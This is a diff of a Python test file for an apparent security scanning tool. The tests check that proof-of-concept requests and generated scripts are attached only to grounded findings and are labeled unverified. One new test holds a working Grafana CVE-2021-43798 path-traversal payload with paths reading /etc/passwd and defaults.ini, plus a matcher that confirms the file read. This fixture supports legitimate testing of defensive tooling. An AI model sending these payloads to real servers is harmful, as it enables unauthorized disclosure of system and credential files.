@@ -54,22 +54,31 @@ def test_grounding_attaches_a_poc_request_only_for_an_observed_safe_read():
     by_id = {f.id: f for f in out}
     # grounding returns one finding per input finding, minting none and dropping none
     assert len(out) == 4
-    # an observed endpoint GET grounds the request, carrying the real receipt
-    assert by_id["f1"].data["poc_request"] == {
-        "method": "GET", "url": "https://api.example.com/config/all",
-        "expect": "HTTP 200 application/json", "source": f"endpoint:{ep_id}"}
+    # an observed endpoint GET grounds the request, carrying the real receipt and a status matcher
+    # so the generated script decides PASS or FAIL rather than leaving the reader to eyeball it
+    req = by_id["f1"].data["poc_request"]
+    assert req["method"] == "GET" and req["url"] == "https://api.example.com/config/all"
+    assert req["urls"] == ["https://api.example.com/config/all"]
+    assert req["expect"] == "HTTP 200 application/json" and req["source"] == f"endpoint:{ep_id}"
+    assert req["matchers"] == [{"type": "status", "part": "body", "values": ["200"], "condition": "or"}]
+    assert req["script"] == "poc/poc-api-example-com.py"
+    # the grounder generates a self-contained stdlib script and stores its text, so the run can
+    # write one runnable PoC file per grounded finding
+    script = by_id["f1"].data["poc_script"]
+    assert script.startswith("#!/usr/bin/env python3") and "urllib.request" in script
+    compile(script, "<poc>", "exec")
     # a verified specification operation grounds too
     assert by_id["f2"].data["poc_request"]["url"] == "https://api.example.com/tasks/active"
     # a url no capability observed is never marked reproducible
     assert "poc_request" not in by_id["f3"].data
     # an exploit proof of concept is never grounded as a safe read
     assert "poc_request" not in by_id["f4"].data
-    # the grounder is the sole authority for the final poc field. A grounded finding carries a
-    # hand-runnable curl labeled unverified, since this run never sends it to the target.
+    # the grounder is the sole authority for the final poc field. A grounded finding points at the
+    # generated script labeled unverified, since this run never sends it to the target.
     assert by_id["f1"].poc.startswith("UNVERIFIED")
-    assert "curl" in by_id["f1"].poc and "https://api.example.com/config/all" in by_id["f1"].poc
-    # an ungroundable safe read gets an honest message, never a fabricated command
-    assert "no reproducible" in by_id["f3"].poc.lower() and "curl" not in by_id["f3"].poc
+    assert "poc/poc-api-example-com.py" in by_id["f1"].poc
+    # an ungroundable safe read gets an honest message, never a fabricated command or script
+    assert "no reproducible" in by_id["f3"].poc.lower() and "poc_script" not in by_id["f3"].data
     # an ungroundable exploit says the demonstration would need authorized exploitation this run
     # does not perform, again with no fabricated command
     assert "authorized exploitation" in by_id["f4"].poc.lower() and "curl" not in by_id["f4"].poc
@@ -77,6 +86,49 @@ def test_grounding_attaches_a_poc_request_only_for_an_observed_safe_read():
     # original stays clean and Finding.data is effectively immutable
     assert "poc_request" not in grounded.data
     assert by_id["f1"] is not grounded
+
+
+def test_a_versioned_cve_finding_grounds_on_the_recipe_across_every_candidate_path():
+    """A known-vulnerability finding whose CVE the lookup tied to the running version grounds on the
+    recipe: every candidate path becomes a url, the recipe's headers and matchers ride into the
+    request, and the generated script decides PASS or FAIL by the recipe's own fire condition."""
+    from opfor.core import Fact
+    from opfor.scenarios.attacksurface.assets.domain.types import (
+        CVE, CVEScan, DomainData, HTTP)
+    from opfor.scenarios.attacksurface.assets.domain.nuclei import Matcher
+    from opfor.core.result import Finding
+    from opfor.scenarios.attacksurface.lifecycle.grounding import (
+        FindingGrounder, ReproductionRecipe)
+
+    world = World()
+    world.add(Node(id="domain:g.example.com", type="domain",
+                   payload=DomainData(name="g.example.com", root="example.com", source="crt")))
+    world.absorb([Fact(kind="http", about="domain:g.example.com",
+                       payload=HTTP(alive=True, status=200, url="https://g.example.com/"))])
+    world.absorb([Fact(kind="cve_scan", about="domain:g.example.com", payload=CVEScan(
+        product="Grafana", version="8.3.0", match="version",
+        cves=(CVE(id="CVE-2021-43798"),)))])
+    recipe = ReproductionRecipe(
+        cve="CVE-2021-43798", method="GET",
+        paths=("/public/plugins/alertlist/../../../etc/passwd", "/public/plugins/alertlist/../../../conf/defaults.ini"),
+        expect="a file read confirms the traversal",
+        matchers=(Matcher(type="regex", part="body", values=("root:.*:0:",), condition="or"),
+                  Matcher(type="status", part="body", values=("200",), condition="or")),
+        matchers_condition="and")
+    finding = Finding(id="v1", title="Grafana CVE-2021-43798 path traversal", severity="HIGH",
+                      where="https://g.example.com", data={"kind": "known-vulnerability"})
+
+    out = FindingGrounder(reproductions=(recipe,)).run(world, (finding,))
+    req = out[0].data["poc_request"]
+    assert req["urls"] == [
+        "https://g.example.com/public/plugins/alertlist/../../../etc/passwd",
+        "https://g.example.com/public/plugins/alertlist/../../../conf/defaults.ini"]
+    assert req["source"] == "reproduction:CVE-2021-43798"
+    assert {"type": "status", "part": "body", "values": ["200"], "condition": "or"} in req["matchers"]
+    assert req["script"] == "poc/cve-2021-43798-g-example-com.py"
+    script = out[0].data["poc_script"]
+    assert "root:.*:0:" in script and "defaults.ini" in script
+    compile(script, "<poc>", "exec")
 
 
 def test_triage_judge_mints_findings_and_mutates_no_world_node():
